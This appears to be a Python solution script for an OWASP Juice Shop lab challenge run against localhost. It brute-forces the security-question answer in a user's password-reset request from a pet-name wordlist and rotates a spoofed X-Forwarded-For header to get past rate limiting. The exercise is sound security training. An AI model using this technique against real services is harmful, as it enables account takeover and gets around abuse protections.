import ipaddress
import requests

PETS = "pets.txt"
CURRENT_IP_SUFFIX = "current_ip_suffix.txt"
JUICESHOP_URL = "http://127.0.0.1:3000/"
RESET_PW = "/rest/user/reset-password"
ANSWER_FIELD = "answer"
MORTY_MAIL = "morty@juice-sh.op"
# MORTY_MAIL = "jim@juice-sh.op"
FAIL = 401
SUCCESS = 200
RESPONSE = "Wrong answer to security question."
CUSTOM_HEADER = "X-Forwarded-For"
START_ADDRESS = "1.0.0.0/0"

json_data = {
    "email":MORTY_MAIL,
    "answer":"",
    "new":"asdfjklö",
    "repeat":"asdfjklö"
}

ip_file = open(CURRENT_IP_SUFFIX, "r")
current_ip_counter = ip_file.readline()
ip_file.close()
ips = ipaddress.IPv4Network(START_ADDRESS, strict=False)
ip_counter = int(current_ip_counter)
ip_file = open(CURRENT_IP_SUFFIX, "w")

with open(PETS, "r") as file:
    for index, pet in enumerate(file.readlines()):
        _pet = pet.replace("\n", "")
        json_data[ANSWER_FIELD] = _pet
        # json_data[ANSWER_FIELD] = "Samuel"
        current_ip = str(ips[ip_counter])
        print("current_ip: ", current_ip)
        request = requests.post(JUICESHOP_URL + RESET_PW, headers={CUSTOM_HEADER: current_ip}, json=json_data)
        status_code = request.status_code
        response = request.content.decode("utf-8") 
        if status_code != FAIL:
            if status_code == SUCCESS:
                print("Successful resettet password for email: '" + MORTY_MAIL + "' | pet: '" + _pet + "' | status code: '" + str(status_code))
            else:
                print("Got some status code not impl for pet: '" + _pet, "' | status code: '" + str(status_code) + "'")
        else:
            if response != RESPONSE:
                print("Got some response not impl for pet: '" + _pet, "' | status code: '" + str(status_code) + "' | response: '" + response + "'")

        if index % 99 == 0:
            ip_counter += 1
    ip_file.write(str(ip_counter))

file.close()
ip_file.close()